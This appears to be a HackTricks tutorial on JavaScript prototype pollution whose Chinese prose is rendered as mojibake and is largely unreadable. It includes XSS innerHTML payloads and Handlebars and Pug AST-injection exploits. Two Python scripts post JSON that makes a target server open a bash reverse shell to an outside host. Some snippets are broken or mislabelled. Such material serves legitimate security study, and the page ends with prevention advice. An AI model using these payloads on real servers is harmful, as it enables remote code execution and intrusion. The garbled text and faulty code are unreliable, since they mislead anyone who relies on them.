# NodeJS - \_\_proto\_\_ & prototype Pollution

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ–åœ¨**Twitter**ä¸Šå…³æ³¨æˆ‘ ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

## JavaScriptä¸­çš„å¯¹è±¡ <a href="#053a" id="053a"></a>

é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦äº†è§£JavaScriptä¸­çš„`Object`ã€‚å¯¹è±¡ç®€å•åœ°æ˜¯é”®å€¼å¯¹çš„é›†åˆï¼Œé€šå¸¸ç§°ä¸ºå¯¹è±¡çš„å±æ€§ã€‚ä¾‹å¦‚ï¼š

![](<../../../.gitbook/assets/image (389) (1).png>)

åœ¨JavaScriptä¸­ï¼Œ`Object`æ˜¯ä¸€ä¸ªåŸºæœ¬å¯¹è±¡ï¼Œç”¨äºæ‰€æœ‰æ–°åˆ›å»ºçš„å¯¹è±¡çš„æ¨¡æ¿ã€‚å¯ä»¥é€šè¿‡å°†`null`ä¼ é€’ç»™`Object.create`æ¥åˆ›å»ºä¸€ä¸ªç©ºå¯¹è±¡ã€‚ç„¶è€Œï¼Œæ–°åˆ›å»ºçš„å¯¹è±¡ä¹Ÿå°†å…·æœ‰ä¸ä¼ é€’çš„å‚æ•°ç›¸å¯¹åº”çš„ç±»å‹ï¼Œå¹¶ç»§æ‰¿æ‰€æœ‰åŸºæœ¬å±æ€§ã€‚
```javascript
console.log(Object.create(null)); // prints an empty object
```
![](<../../../.gitbook/assets/image (360).png>)

ä¹‹å‰æˆ‘ä»¬å­¦ä¹ åˆ°ï¼Œåœ¨JavaScriptä¸­ï¼Œå¯¹è±¡æ˜¯é”®å’Œå€¼çš„é›†åˆï¼Œå› æ­¤`null`å¯¹è±¡å°±æ˜¯ä¸€ä¸ªç©ºå­—å…¸ï¼š`{}`

## JavaScriptä¸­çš„å‡½æ•°/ç±» <a href="#55dd" id="55dd"></a>

åœ¨JavaScriptä¸­ï¼Œç±»å’Œå‡½æ•°çš„æ¦‚å¿µæ˜¯ç›¸äº’å…³è”çš„ï¼ˆå‡½æ•°æœ¬èº«å……å½“ç±»çš„æ„é€ å‡½æ•°ï¼Œå®é™…ä¸ŠJavaScriptä¸­æ²¡æœ‰â€œç±»â€çš„æ¦‚å¿µï¼‰ã€‚è®©æˆ‘ä»¬çœ‹ä¸‹é¢çš„ä¾‹å­ï¼š
```javascript
function person(fullName, age) {
this.age = age;
this.fullName = fullName;
this.details = function() {
return this.fullName + " has age: " + this.age;
}
}
```
![](<../../../.gitbook/assets/image (361).png>)
```javascript
var person1 = new person("Satoshi", 70);
```
![](<../../../.gitbook/assets/image (362).png>)

## JavaScriptä¸­çš„åŸå‹ <a href="#3843" id="3843"></a>

éœ€è¦æ³¨æ„çš„ä¸€ç‚¹æ˜¯ï¼Œåœ¨æ‰§è¡Œä»£ç æ—¶ï¼ŒåŸå‹å±æ€§å¯ä»¥è¢«æ›´æ”¹/ä¿®æ”¹/åˆ é™¤ã€‚ä¾‹å¦‚ï¼Œå¯ä»¥åŠ¨æ€æ·»åŠ ç±»çš„å‡½æ•°ï¼š

![](<../../../.gitbook/assets/image (363).png>)

ç±»çš„å‡½æ•°ä¹Ÿå¯ä»¥è¢«ä¿®æ”¹ï¼ˆå¦‚`toString`æˆ–`valueOf`çš„æƒ…å†µï¼‰ï¼š

![](<../../../.gitbook/assets/image (364).png>)

![](<../../../.gitbook/assets/image (365).png>)

## ç»§æ‰¿

åœ¨åŸºäºåŸå‹çš„ç¨‹åºä¸­ï¼Œå¯¹è±¡ä»ç±»ä¸­ç»§æ‰¿å±æ€§/æ–¹æ³•ã€‚è¿™äº›ç±»æ˜¯é€šè¿‡å‘å¦ä¸€ä¸ªç±»çš„å®ä¾‹æ·»åŠ å±æ€§/æ–¹æ³•æˆ–å°†å®ƒä»¬æ·»åŠ åˆ°ç©ºå¯¹è±¡æ¥æ´¾ç”Ÿçš„ã€‚

è¯·æ³¨æ„ï¼Œå¦‚æœå‘ç”¨ä½œä¸€ç»„å¯¹è±¡åŸå‹çš„å¯¹è±¡ï¼ˆå¦‚`myPersonObj`ï¼‰æ·»åŠ å±æ€§ï¼Œåˆ™å®ƒæ˜¯åŸå‹çš„å¯¹è±¡ä¹Ÿä¼šè·å¾—æ–°å±æ€§ï¼Œä½†é™¤éæ˜ç¡®è°ƒç”¨ï¼Œå¦åˆ™ä¸ä¼šæ‰“å°è¯¥å±æ€§ã€‚

![](<../../../.gitbook/assets/image (366).png>)

## \_\_proto\_\_ æ±¡æŸ“ <a href="#0d0a" id="0d0a"></a>

æ‚¨åº”è¯¥å·²ç»äº†è§£åˆ°**JavaScriptä¸­çš„æ¯ä¸ªå¯¹è±¡åªæ˜¯é”®å€¼å¯¹çš„é›†åˆ**ï¼Œå¹¶ä¸”**æ¯ä¸ªå¯¹è±¡éƒ½ç»§æ‰¿è‡ªJavaScriptä¸­çš„Objectç±»å‹**ã€‚è¿™æ„å‘³ç€ï¼Œå¦‚æœæ‚¨èƒ½å¤Ÿæ±¡æŸ“Objectç±»å‹ï¼Œ**ç¯å¢ƒä¸­çš„æ¯ä¸ªJavaScriptå¯¹è±¡éƒ½å°†è¢«æ±¡æŸ“ï¼**

è¿™ç›¸å½“ç®€å•ï¼Œæ‚¨åªéœ€è¦èƒ½å¤Ÿä¿®æ”¹ä»»æ„JavaScriptå¯¹è±¡çš„ä¸€äº›å±æ€§ï¼ˆé”®å€¼å¯¹ï¼‰ï¼Œå› ä¸ºæ¯ä¸ªå¯¹è±¡éƒ½ç»§æ‰¿è‡ªObjectï¼Œæ‰€ä»¥æ¯ä¸ªå¯¹è±¡éƒ½å¯ä»¥è®¿é—®Objectæ¨¡å¼ã€‚
```javascript
function person(fullName) {
this.fullName = fullName;
}
var person1 = new person("Satoshi");
```
ä»å‰é¢çš„ç¤ºä¾‹ä¸­ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹å¼è®¿é—®å¯¹è±¡çš„ç»“æ„ï¼š
```javascript
person1.__proto__.__proto__
person.__proto__.__proto__
```
å› æ­¤ï¼Œæ­£å¦‚ä¹‹å‰æåˆ°çš„ï¼Œå¦‚æœç°åœ¨å‘å¯¹è±¡æ–¹æ¡ˆæ·»åŠ äº†ä¸€ä¸ªå±æ€§ï¼Œé‚£ä¹ˆæ¯ä¸ª JavaScript å¯¹è±¡éƒ½å°†å¯ä»¥è®¿é—®åˆ°è¿™ä¸ªæ–°å±æ€§ï¼š
```javascript
function person(fullName) {
this.fullName = fullName;
}
var person1 = new person("Satoshi");
//Add function as new property
person1.__proto__.__proto__.printHello = function(){console.log("Hello");}
person1.printHello() //This now works and prints hello
//Add constant as new property
person1.__proto__.__proto__.globalconstant = true
person1.globalconstant  //This now works and is "true"
```
æ‰€ä»¥ç°åœ¨æ¯ä¸ªJSå¯¹è±¡å°†åŒ…å«æ–°å±æ€§ï¼šå‡½æ•°`printHello`å’Œæ–°å¸¸é‡`globalconstant`

## åŸå‹æ±¡æŸ“

è¿™ç§æŠ€æœ¯ä¸åƒä¹‹å‰çš„é‚£ç§æœ‰æ•ˆï¼Œå› ä¸ºä½ æ— æ³•æ±¡æŸ“JSå¯¹è±¡çš„ç»“æ„ã€‚ä½†åœ¨**ç¦æ­¢ä½¿ç”¨å…³é”®å­—`__proto__`çš„æƒ…å†µä¸‹ï¼Œè¿™ç§æŠ€æœ¯å¯èƒ½ä¼šæœ‰ç”¨**ã€‚

å¦‚æœä½ èƒ½å¤Ÿä¿®æ”¹å‡½æ•°çš„å±æ€§ï¼Œä½ å¯ä»¥ä¿®æ”¹å‡½æ•°çš„`prototype`å±æ€§ï¼Œ**åœ¨è¿™é‡Œæ·»åŠ çš„æ¯ä¸ªæ–°å±æ€§éƒ½å°†è¢«è¯¥å‡½æ•°åˆ›å»ºçš„æ¯ä¸ªå¯¹è±¡ç»§æ‰¿ï¼š**
```javascript
function person(fullName) {
this.fullName = fullName;
}
var person1 = new person("Satoshi");
//Add function as new property
person.prototype.sayHello = function(){console.log("Hello");}
person1.sayHello() //This now works and prints hello
//Add constant as new property
person.prototype.newConstant = true
person1.newConstant //This now works and is "true"

//The same could be achieved using this other way:
person1.constructor.prototype.sayHello = function(){console.log("Hello");}
person1.constructor.prototype.newConstant = true
```
åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œåªæœ‰ä»`person`ç±»åˆ›å»ºçš„å¯¹è±¡ä¼šå—åˆ°å½±å“ï¼Œä½†å®ƒä»¬ç°åœ¨å°†ç»§æ‰¿`sayHello`å’Œ`newConstant`å±æ€§ã€‚

**æœ‰ä¸¤ç§æ»¥ç”¨åŸå‹æ±¡æŸ“ä»¥æ±¡æŸ“æ¯ä¸ªJSå¯¹è±¡çš„æ–¹æ³•ã€‚**

ç¬¬ä¸€ç§æ–¹æ³•æ˜¯æ±¡æŸ“**Object**çš„åŸå‹å±æ€§ï¼ˆæ­£å¦‚ä¹‹å‰æåˆ°çš„ï¼Œæ¯ä¸ªJSå¯¹è±¡éƒ½ç»§æ‰¿è‡ªæ­¤å¯¹è±¡ï¼‰ï¼š
```javascript
Object.prototype.sayBye = function(){console.log("bye!")}
```
å¦‚æœä½ æˆåŠŸåšåˆ°äº†ï¼Œæ¯ä¸ªJSå¯¹è±¡å°†èƒ½å¤Ÿæ‰§è¡Œå‡½æ•° `sayBye`ã€‚

å¦ä¸€ç§æ–¹æ³•æ˜¯æ¯’åŒ–å­—å…¸å˜é‡æ„é€ å‡½æ•°çš„åŸå‹ï¼Œå°±åƒä¸‹é¢çš„ä¾‹å­ä¸€æ ·ï¼š
```javascript
something = {"a": "b"}
something.constructor.prototype.sayHey = function(){console.log("Hey!")}
```
åœ¨æ‰§è¡Œè¯¥ä»£ç åï¼Œ**æ¯ä¸ªJSå¯¹è±¡å°†èƒ½å¤Ÿæ‰§è¡Œå‡½æ•° `sayHey`**ã€‚

## æ±¡æŸ“å…¶ä»–å¯¹è±¡

### ä»ä¸€ä¸ªç±»åˆ° Object.prototype

åœ¨ä¸€ä¸ªåœºæ™¯ä¸­ï¼Œä½ å¯ä»¥**æ±¡æŸ“ä¸€ä¸ªç‰¹å®šå¯¹è±¡**å¹¶ä¸”éœ€è¦**è®¿é—® `Object.prototype`**ï¼Œä½ å¯ä»¥ä½¿ç”¨ç±»ä¼¼ä»¥ä¸‹ä»£ç è¿›è¡Œæœç´¢ï¼š
```javascript
// From https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/

// Search from "window" object
for(let key of Object.getOwnPropertyNames(window)) {
if (window[key]?.constructor.prototype === Object.prototype) {
console.log(key)
}
}

// Imagine that the original object was document.querySelector('a')
// With this code you could find some attributes to get the object "window" from that one
for(let key1 in document.querySelector('a')) {
for(let key2 in document.querySelector('a')[key1]) {
if (document.querySelector('a')[key1][key2] === window) {
console.log(key1 + "." + key2)
}
}
}
```
### æ•°ç»„å…ƒç´ æ±¡æŸ“

è¯·æ³¨æ„ï¼Œæ­£å¦‚æ‚¨å¯ä»¥æ±¡æŸ“JSå¯¹è±¡çš„å±æ€§ä¸€æ ·ï¼Œå¦‚æœæ‚¨å¯ä»¥è®¿é—®æ±¡æŸ“ä¸€ä¸ªæ•°ç»„ï¼Œæ‚¨ä¹Ÿå¯ä»¥**æ±¡æŸ“æ•°ç»„çš„å€¼**ï¼Œè¿™äº›å€¼å¯ä»¥é€šè¿‡**ç´¢å¼•**è®¿é—®ï¼ˆè¯·æ³¨æ„ï¼Œæ‚¨æ— æ³•è¦†ç›–å€¼ï¼Œå› æ­¤æ‚¨éœ€è¦æ±¡æŸ“æŸç§æ–¹å¼ä½¿ç”¨ä½†æœªå†™å…¥çš„ç´¢å¼•ï¼‰ã€‚
```javascript
c = [1,2]
a = []
a.constructor.prototype[1] = "yolo"
b = []
b[0] //undefined
b[1] //"yolo"
c[1] // 2 -- not
```
### Htmlå…ƒç´ æ±¡æŸ“

åœ¨é€šè¿‡JSç”ŸæˆHTMLå…ƒç´ æ—¶ï¼Œå¯ä»¥**è¦†ç›–** **`innerHTML`** å±æ€§ï¼Œä½¿å…¶ç¼–å†™**ä»»æ„HTMLä»£ç ã€‚** [çµæ„Ÿå’Œç¤ºä¾‹æ¥è‡ªæ­¤è§£è¯´](https://blog.huli.tw/2022/04/25/en/intigriti-0422-xss-challenge-author-writeup/).

{% code overflow="wrap" %}
```javascript
// Create element
devSettings["root"] = document.createElement('main')

// Pollute innerHTML
settings[root][innerHTML]=<"svg onload=alert(1)>"

// Pollute innerHTML of the ownerProperty to avoid overwrites of innerHTML killing the payload
settings[root][ownerDocument][body][innerHTML]="<svg onload=alert(document.domain)>"
```
{% endcode %}

## ä¾‹å­

### åŸºæœ¬ç¤ºä¾‹

é‚£ä¹ˆåŸå‹æ±¡æŸ“å‡ºç°åœ¨å“ªé‡Œå‘¢ï¼Ÿå½“åº”ç”¨ç¨‹åºä¸­å­˜åœ¨æ¼æ´ï¼Œä½¿å¾—å¯ä»¥è¦†ç›– `Object.prototype` çš„å±æ€§æ—¶ï¼ŒåŸå‹æ±¡æŸ“å°±ä¼šå‘ç”Ÿã€‚ç”±äºæ¯ä¸ªå…¸å‹å¯¹è±¡éƒ½ä» `Object.prototype` ç»§æ‰¿å…¶å±æ€§ï¼Œæˆ‘ä»¬å¯ä»¥æ”¹å˜åº”ç”¨ç¨‹åºçš„è¡Œä¸ºã€‚æœ€å¸¸è§çš„ç¤ºä¾‹å¦‚ä¸‹ï¼š
```javascript
if (user.isAdmin) {   // do something important!}
```
å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªåŸå‹æ±¡æŸ“ï¼Œä½¿å¾—å¯ä»¥è®¾ç½® `Object.prototype.isAdmin = true`ã€‚ç„¶åï¼Œé™¤éåº”ç”¨ç¨‹åºæ˜ç¡®åˆ†é…ä»»ä½•å€¼ï¼Œ`user.isAdmin` æ€»æ˜¯ä¸º trueï¼

![](https://research.securitum.com/wp-content/uploads/sites/2/2019/10/image-1.png)

ä¾‹å¦‚ï¼Œ`obj[a][b] = value`ã€‚å¦‚æœæ”»å‡»è€…å¯ä»¥æ§åˆ¶ `a` å’Œ `value` çš„å€¼ï¼Œé‚£ä¹ˆä»–åªéœ€è¦å°† `a` çš„å€¼è°ƒæ•´ä¸º `__proto__`ï¼ˆåœ¨ JavaScript ä¸­ï¼Œ`obj["__proto__"]` å’Œ `obj.__proto__` æ˜¯å®Œå…¨ç­‰æ•ˆçš„ï¼‰ï¼Œé‚£ä¹ˆåº”ç”¨ç¨‹åºä¸­æ‰€æœ‰ç°æœ‰å¯¹è±¡çš„å±æ€§ `b` å°†è¢«åˆ†é…ä¸º `value`ã€‚

ç„¶è€Œï¼Œæ ¹æ®[è®ºæ–‡](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript\_prototype\_pollution\_attack\_in\_NodeJS.pdf)ï¼Œæ”»å‡»å¹¶ä¸åƒä¸Šé¢é‚£æ ·ç®€å•ï¼Œæˆ‘ä»¬åªèƒ½åœ¨æ»¡è¶³ä»¥ä¸‹ä¸‰ä¸ªæ¡ä»¶ä¹‹ä¸€æ—¶è¿›è¡Œæ”»å‡»ï¼š

* æ‰§è¡Œé€’å½’åˆå¹¶
* æŒ‰è·¯å¾„å®šä¹‰å±æ€§
* å…‹éš†å¯¹è±¡

### è¦†ç›–å‡½æ•°
```python
customer.__proto__.toString = ()=>{alert("polluted")}
```
### Proto Pollution to RCE

{% content-ref url="prototype-pollution-to-rce.md" %}
[prototype-pollution-to-rce.md](prototype-pollution-to-rce.md)
{% endcontent-ref %}

## å®¢æˆ·ç«¯åŸå‹æ±¡æŸ“åˆ° XSS

{% content-ref url="client-side-prototype-pollution.md" %}
[client-side-prototype-pollution.md](client-side-prototype-pollution.md)
{% endcontent-ref %}

### CVE-2019â€“11358: é€šè¿‡ jQuery $ .extend è¿›è¡ŒåŸå‹æ±¡æŸ“æ”»å‡»

$ .extendï¼Œå¦‚æœå¤„ç†ä¸å½“ï¼Œå¯ä»¥æ›´æ”¹å¯¹è±¡ `prototype`ï¼ˆåº”ç”¨ç¨‹åºä¸­å¯¹è±¡çš„æ¨¡æ¿ï¼‰çš„å±æ€§ã€‚ç„¶åï¼Œè¿™ä¸ªå±æ€§å°†å‡ºç°åœ¨æ‰€æœ‰å¯¹è±¡ä¸Šã€‚è¯·æ³¨æ„ï¼Œåªæœ‰â€œæ·±å±‚â€ç‰ˆæœ¬ï¼ˆå³ gï¼‰çš„ $ .extend å—åˆ°å½±å“ã€‚

ç¨‹åºå‘˜ç»å¸¸ä½¿ç”¨æ­¤å‡½æ•°æ¥å¤åˆ¶å¯¹è±¡æˆ–ä»é»˜è®¤å¯¹è±¡ä¸­å¡«å……æ–°å±æ€§ã€‚ä¾‹å¦‚ï¼š

æˆ‘ä»¬å¯ä»¥æƒ³è±¡ `myObject` æ˜¯æ¥è‡ªç”¨æˆ·çš„è¾“å…¥å­—æ®µï¼Œå¹¶è¢«åºåˆ—åŒ–åˆ°æ•°æ®åº“ä¸­ã€‚

åœ¨è¿™æ®µä»£ç ä¸­ï¼Œæˆ‘ä»¬ç»å¸¸è®¤ä¸ºï¼Œåœ¨è¿è¡Œæ—¶ä¼šå°†å±æ€§ `isAdmin` åˆ†é…ç»™æ–°åˆ›å»ºçš„å¯¹è±¡ã€‚ä½†å®è´¨ä¸Šï¼Œå®ƒç›´æ¥åˆ†é…ç»™ `{}`ï¼Œç„¶å `{}.isAdmin` å°†æ˜¯ `true`ã€‚å¦‚æœåœ¨æ­¤ä»£ç ä¹‹åï¼Œæˆ‘ä»¬æ‰§è¡Œä»¥ä¸‹æ£€æŸ¥ï¼š
```javascript
If (user.isAdmin === true) {
// do something for admin
}
```
å¦‚æœç”¨æˆ·å°šä¸å­˜åœ¨ï¼ˆ`undefined`ï¼‰ï¼Œå°†åœ¨å…¶çˆ¶å¯¹è±¡ä¸­æœç´¢å±æ€§`isAdmin`ï¼Œè¯¥çˆ¶å¯¹è±¡æ˜¯åœ¨ä¸Šé¢æ·»åŠ äº†å€¼ä¸º`true`çš„`isAdmin`çš„å¯¹è±¡ã€‚

åœ¨æ‰§è¡ŒJQuery 3.3.1æ—¶çš„å¦ä¸€ä¸ªç¤ºä¾‹ï¼š
```javascript
$.extend(true, {}, JSON.parse('{"__proto__": {"devMode": true}}'))
console.log({}.devMode); // true
```
### CVE-2018â€“3721, CVE-2019â€“10744: é€šè¿‡lodashè¿›è¡ŒåŸå‹æ±¡æŸ“æ”»å‡»

[Lodash](https://www.npmjs.com/package/lodash)ä¹Ÿæ˜¯ä¸€ä¸ªçŸ¥åçš„åº“ï¼Œæä¾›äº†è®¸å¤šä¸åŒçš„å‡½æ•°ï¼Œå¸®åŠ©æˆ‘ä»¬æ›´æ–¹ä¾¿ã€æ›´æ•´æ´åœ°ç¼–å†™ä»£ç ï¼Œæ¯å‘¨ä¸‹è½½é‡è¶…è¿‡1900ä¸‡æ¬¡ã€‚å®ƒä¹Ÿé‡åˆ°äº†ä¸JQueryç›¸åŒçš„é—®é¢˜ã€‚

**CVE-2018â€“3721**

**CVE-2019â€“10744**

è¿™ä¸ªæ¼æ´å½±å“æ‰€æœ‰ç‰ˆæœ¬çš„Lodashï¼Œåœ¨ç‰ˆæœ¬4.17.11ä¸­å·²ä¿®å¤ã€‚

### å¦ä¸€ä¸ªå¸¦æœ‰CVEçš„æ•™ç¨‹

{% embed url="https://infosecwriteups.com/javascript-prototype-pollution-practice-of-finding-and-exploitation-f97284333b2" %}

### NodeJSä¸­çš„ASTåŸå‹æ±¡æŸ“

NodeJSå¹¿æ³›åˆ©ç”¨JavaScriptä¸­çš„æŠ½è±¡è¯­æ³•æ ‘ï¼ˆASTï¼‰æ¥å®ç°è¯¸å¦‚æ¨¡æ¿å¼•æ“å’ŒTypeScriptç­‰åŠŸèƒ½ã€‚æœ¬èŠ‚æ¢è®¨äº†ä¸æ¨¡æ¿å¼•æ“ï¼ˆç‰¹åˆ«æ˜¯Handlebarså’ŒPugï¼‰ä¸­åŸå‹æ±¡æŸ“ç›¸å…³çš„æ¼æ´ã€‚

#### Handlebarsæ¼æ´åˆ†æ

Handlebarsæ¨¡æ¿å¼•æ“å¯èƒ½ä¼šè¢«åˆ©ç”¨è¿›è¡ŒåŸå‹æ±¡æŸ“ã€‚æ¼æ´ä¸»è¦å­˜åœ¨äº`javascript-compiler.js`æ–‡ä»¶ä¸­çš„`appendContent`å’Œ`pushSource`å‡½æ•°ä¸­ï¼Œå…¶ä¸­`appendContent`ä¼šåœ¨å­˜åœ¨`pendingContent`æ—¶è¿æ¥`pendingContent`ï¼Œè€Œ`pushSource`åœ¨æ¨é€æºç åå°†`pendingContent`è®¾ç½®ä¸º`undefined`ã€‚

##### åˆ©ç”¨è¿‡ç¨‹

åˆ©ç”¨æ¶‰åŠæ“çºµHandlebarsç”Ÿæˆçš„ASTã€‚è¿‡ç¨‹å¦‚ä¸‹ï¼š

1. **è§£æå™¨æ“çºµ**ï¼šè§£æå™¨é€šè¿‡`NumberLiteral`èŠ‚ç‚¹å¼ºåˆ¶å€¼ä¸ºæ•°å­—ã€‚ä½†æ˜¯ï¼Œè¿™å¯ä»¥é€šè¿‡åŸå‹æ±¡æŸ“ç»•è¿‡ï¼Œå…è®¸æ’å…¥éæ•°å­—å­—ç¬¦ä¸²ã€‚
2. **ç¼–è¯‘å™¨å¤„ç†**ï¼šç¼–è¯‘å™¨æ¥å—ASTå¯¹è±¡æˆ–æ¨¡æ¿å­—ç¬¦ä¸²ã€‚å¦‚æœ`input.type`ä¸º`Program`ï¼Œåˆ™è®¤ä¸ºè¾“å…¥å·²ç»é¢„è§£æï¼Œå¯èƒ½å¯¼è‡´åˆ©ç”¨ã€‚
3. **ä»£ç æ³¨å…¥**ï¼šé€šè¿‡æ“çºµ`Object.prototype`ï¼Œå¯ä»¥å°†ä»»æ„ä»£ç æ³¨å…¥æ¨¡æ¿å‡½æ•°ï¼Œå¯èƒ½å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

Handlebarsæ¼æ´åˆ©ç”¨ç¤ºä¾‹ï¼š
```javascript
const Handlebars = require('handlebars');

Object.prototype.type = 'Program';
Object.prototype.body = [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "console.log(process.mainModule.require('child_process').execSync('id').toString())"
}],
"loc": {
"start": 0,
"end": 0
}
}];

const source = `Hello {{ msg }}`;
const template = Handlebars.precompile(source);

console.log(eval('(' + template + ')')['main'].toString());
```
ä¸Šè¿°ä»£ç æ¼”ç¤ºäº†æ”»å‡»è€…å¦‚ä½•å°†ä»»æ„ä»£ç æ³¨å…¥Handlebarsæ¨¡æ¿ã€‚

**å¤–éƒ¨å‚è€ƒ**: [ä¸'flat'åº“ä¸­åŸå‹æ±¡æŸ“ç›¸å…³çš„é—®é¢˜](https://github.com/hughsk/flat/issues/105)

Pythonä¸­åŸå‹æ±¡æŸ“çš„ç¤ºä¾‹ï¼š
```python
import requests

TARGET_URL = 'http://10.10.10.10:9090'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.type": "Program",
"__proto__.body": [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}],
"loc": {
"start": 0,
"end": 0
}
}]
})

# execute
requests.get(TARGET_URL)
```
#### Pugæ¼æ´

ä¸Handlebarsç±»ä¼¼ï¼ŒPugä¹Ÿå¯ä»¥é€šè¿‡åŸå‹æ±¡æŸ“è¿›è¡Œåˆ©ç”¨ã€‚æ›´å¤šä¿¡æ¯è¯·å‚é˜…[Pugä¸­çš„ASTæ³¨å…¥](https://blog.p6.is/AST-Injection/#Pug)ã€‚

Pugä¸­åŸå‹æ±¡æŸ“çš„ç¤ºä¾‹ï¼š
```python
import requests

TARGET_URL = 'http://10.10.10.10:9090'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.block": {
"type": "Text",
"line": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}
})

# execute
requests.get(TARGET_URL)
```
### é¢„é˜²æªæ–½

ä¸ºäº†å‡å°‘åŸå‹æ±¡æŸ“çš„é£é™©ï¼Œè¯·è€ƒè™‘ä»¥ä¸‹ç­–ç•¥ï¼š

1. **å¯¹è±¡ä¸å¯å˜æ€§**ï¼šåˆ©ç”¨ `Object.freeze` ä½¿ `Object.prototype` ä¸å¯å˜ã€‚
2. **è¾“å…¥éªŒè¯**ï¼šæ ¹æ®åº”ç”¨ç¨‹åºçš„æ¨¡å¼ä¸¥æ ¼éªŒè¯ JSON è¾“å…¥ã€‚
3. **å®‰å…¨åˆå¹¶å‡½æ•°**ï¼šé¿å…ä¸å®‰å…¨åœ°ä½¿ç”¨é€’å½’åˆå¹¶å‡½æ•°ã€‚
4. **æ— åŸå‹å¯¹è±¡**ï¼šä½¿ç”¨ `Object.create(null)` åˆ›å»ºæ²¡æœ‰åŸå‹å±æ€§çš„å¯¹è±¡ã€‚
5. **ä½¿ç”¨ Map**ï¼šé€‰æ‹© `Map` è€Œä¸æ˜¯ `Object` ç”¨äºé”®å€¼å¯¹ã€‚
6. **åº“æ›´æ–°**ï¼šå®šæœŸæ›´æ–°åº“ä»¥æ•´åˆå®‰å…¨è¡¥ä¸ã€‚



## å‚è€ƒèµ„æ–™

* [https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
* [https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l](https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l)
* [https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)
* [https://blog.p6.is/AST-Injection/](https://blog.p6.is/AST-Injection/)

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„ **å…¬å¸åœ¨ HackTricks ä¸­åšå¹¿å‘Š** æˆ– **ä¸‹è½½ PDF ç‰ˆæœ¬çš„ HackTricks**ï¼Œè¯·æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å– [**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* æ¢ç´¢ [**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶ [**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘çš„ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* é€šè¿‡å‘ [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
